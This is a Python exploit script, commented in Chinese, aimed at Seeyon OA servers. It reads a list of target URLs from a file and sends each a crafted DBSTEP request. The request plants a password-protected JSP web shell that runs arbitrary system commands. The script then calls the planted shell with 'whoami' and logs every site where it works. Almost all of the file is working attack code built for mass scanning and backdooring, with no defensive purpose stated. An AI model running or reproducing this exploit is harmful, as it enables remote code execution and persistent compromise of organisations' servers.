import requests
import urllib.parse
import pandas as pd
# 1.u.txt中保存你的目标站点 2.运行python文件 3.生成vul.txt文件
def seeyou(urls):
	poc='''
	DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
	OPTION=S3WYOSWLBSGr
	currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
	CREATEDATE=wUghPB3szB3Xwg66
	RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
	originalFileId=wV66
	originalCreateDate=wUghPB3szB3Xwg66
	FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
	needReadFile=yRWZdAS6
	originalCreateDate=wLSGP4oEzLKAz4=iz=66
	<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
	'''
	res=requests.post(url=urls,data=poc)

	parsed_uri = urllib.parse.urlparse(urls)
	host=parsed_uri.netloc
	scheme_web=parsed_uri.scheme
	vul_url=scheme_web+'://'+host+'/seeyon/test123456.jsp?&pwd=asasd3344&cmd=whoami'
	vul_res=requests.get(url=vul_url)
	if vul_res.status_code == 200:
		print(vul_url)
		with open('vul.txt', mode='a', encoding='utf-8') as f:
			f.write(vul_url+'\n')

def main():
	print("vul url:")
	url_lst=[]
	#     f=open('ip.txt',encoding='utf8')
	f = pd.read_csv(open(r'u.txt'))
	#     ip_str=f.readlines()
	for u in list(f['U']):
	    u=u.replace(' ', '')
	    u=u.replace('\n', '')
	    u_lst=[u]
	    url_lst=url_lst+u_lst
	for i in url_lst:
		seeyou(i)
if __name__ == '__main__':
    main()